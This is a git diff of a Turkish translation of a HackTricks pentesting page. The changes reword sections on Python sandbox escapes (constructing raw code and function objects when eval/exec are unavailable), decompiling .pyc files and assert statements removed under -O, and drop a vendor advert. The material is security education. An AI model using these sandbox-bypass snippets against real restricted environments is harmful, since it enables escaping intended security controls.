@@ -1247,7 +986,7 @@ mydict['__builtins__'] = __builtins__
 codeobj = code_type(0, 0, 3, 64, bytecode, consts, names, (), 'noname', '<module>', 1, '', (), ())
 function_type(codeobj, mydict, None, None, None)()
 ```
-Eğer `eval` veya `exec`'e erişim sağlayamıyorsanız, bir **uygun fonksiyon** oluşturabilirsiniz, ancak bunu doğrudan çağırmak genellikle _sınırlı modda erişilemez yapılandırıcı_ hatasıyla sonuçlanacaktır. Bu nedenle, bu fonksiyonu çağırmak için **sınırlı ortamda olmayan bir fonksiyona ihtiyacınız vardır.**
+Eğer `eval` veya `exec`'e erişim sağlayamıyorsanız, **uygun bir fonksiyon** oluşturabilirsiniz, ancak bunu doğrudan çağırmak genellikle başarısız olacaktır: _sınırlı modda constructor erişilemez_. Bu nedenle, bu fonksiyonu çağırmak için **sınırlı ortamda olmayan bir fonksiyona ihtiyacınız vardır.**
 ```python
 #Compile a regular print
 ftype = type(lambda: None)
@@ -1255,22 +994,22 @@ ctype = type((lambda: None).func_code)
 f = ftype(ctype(1, 1, 1, 67, '|\x00\x00GHd\x00\x00S', (None,), (), ('s',), 'stdin', 'f', 1, ''), {})
 f(42)
 ```
-## Derlenmiş Python Kodunu Geri Dönüştürme
+## Derlenmiş Python Kodunu Geri Çözme
 
-[**https://www.decompiler.com/**](https://www.decompiler.com) gibi araçlar kullanılarak, derlenmiş Python kodu geri dönüştürülebilir.
+[**https://www.decompiler.com/**](https://www.decompiler.com) gibi araçlar kullanılarak verilen derlenmiş python kodu **geri çözülebilir**.
 
-Bu öğreticiye göz atın:
+**Bu öğreticiye göz atın**:
 
 {% content-ref url="../../../forensics/basic-forensic-methodology/specific-software-file-type-tricks/.pyc.md" %}
 [.pyc.md](../../../forensics/basic-forensic-methodology/specific-software-file-type-tricks/.pyc.md)
 {% endcontent-ref %}
 
-## Misc Python
+## Çeşitli Python
 
 ### Assert
 
-Python, `-O` parametresiyle optimize edildiğinde, **debug** değerine bağlı olarak yapılan asset ifadelerini ve herhangi bir koşula bağlı olan kodu kaldırır.\
-Bu nedenle, aşağıdaki gibi kontrol ifadeleri kullanmak yerine,
+Python, `-O` parametresi ile optimize edilerek çalıştırıldığında, **debug** değerine bağlı olarak yapılan asset ifadelerini ve kodu kaldıracaktır.\
+Bu nedenle, şu gibi kontroller:
 ```python
 def check_permission(super_user):
 try:
@@ -1288,25 +1027,18 @@ print(f"\nNot a Super User!!!\n")
 * [https://nedbatchelder.com/blog/201206/eval\_really\_is\_dangerous.html](https://nedbatchelder.com/blog/201206/eval\_really\_is\_dangerous.html)
 * [https://infosecwriteups.com/how-assertions-can-get-you-hacked-da22c84fb8f6](https://infosecwriteups.com/how-assertions-can-get-you-hacked-da22c84fb8f6)
 
-
-<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>
-
-En önemli güvenlik açıklarını bulun, böylece daha hızlı düzeltebilirsiniz. Intruder saldırı yüzeyinizi takip eder, proaktif tehdit taramaları yapar, API'lerden web uygulamalarına ve bulut sistemlerine kadar tüm teknoloji yığınınızda sorunları bulur. [**Ücretsiz deneyin**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) bugün.
-
-{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}
-
 ***
 
 <details>
 
-<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sıfırdan kahraman olmak için AWS hackleme öğrenin<strong>!</strong></summary>
+<summary><strong>AWS hacklemeyi sıfırdan kahramana öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> ile</strong></summary>
 
-HackTricks'i desteklemenin diğer yolları:
+HackTricks'ı desteklemenin diğer yolları:
 
-* Şirketinizi HackTricks'te **reklamınızı görmek veya HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
+* **Şirketinizi HackTricks'te reklamınızı görmek** veya **HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
 * [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
-* Özel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluşan koleksiyonumuz olan [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keşfedin
-* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya bizi **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**'da takip edin.**
-* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR göndererek paylaşın.
+* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'i keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
+* 💬 **Discord grubuna** katılın veya [**telegram grubuna**](https://t.me/peass) katılın veya bizi **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)'da **takip edin**.
+* **Hacking püf noktalarınızı göndererek PR'ler aracılığıyla** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına **paylaşın**.
 
 </details>
